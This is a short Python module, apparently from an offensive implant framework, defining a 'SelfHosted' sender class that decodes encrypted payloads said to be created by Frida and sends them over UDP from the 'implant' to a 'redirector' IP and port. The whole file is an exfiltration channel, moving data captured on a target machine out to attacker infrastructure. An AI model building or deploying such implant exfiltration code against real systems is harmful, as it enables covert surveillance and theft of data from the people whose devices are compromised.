from senders.sender import Sender
import logging as log
import socket
import base64

class SelfHosted (Sender):

    def __init__ (self, redirector_ip, redirector_port):
        """
        Constructor

        @param redirector_ip: string
                        IP of the redirector, where the data will be sent.

        @param redirector_port: int
                        Port of the redirector, where the data will be sent.
        """
        self.redirector_ip = redirector_ip
        self.redirector_port = redirector_port

        # Message type to indicate the redirector that we want to send an event from
        # the implant
        self.IMPLANT_EVENT = b'\x01'



    def send_data (self, encrypted_b64):
        """
        Sends the data to the appropriate redirector. This works in a best-effort basis;
        meaning, it doesn't (and probably can't even if it wanted to) verify the message
        arrived at the destination.

        This method doesn't return anything.

        @param enc_b64: string
                        Base64-encoded and encrypted payload created by Frida.
        """
        addr = (self.redirector_ip, self.redirector_port)

        # It's more efficient to send the raw bytes, to avoid sending multiple UDP packets
        decoded = base64.urlsafe_b64decode (encrypted_b64)

        sock = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto (self.IMPLANT_EVENT + decoded, addr)
        log.info (f"Data sent to udp://{addr[0]}:{addr[1]}")

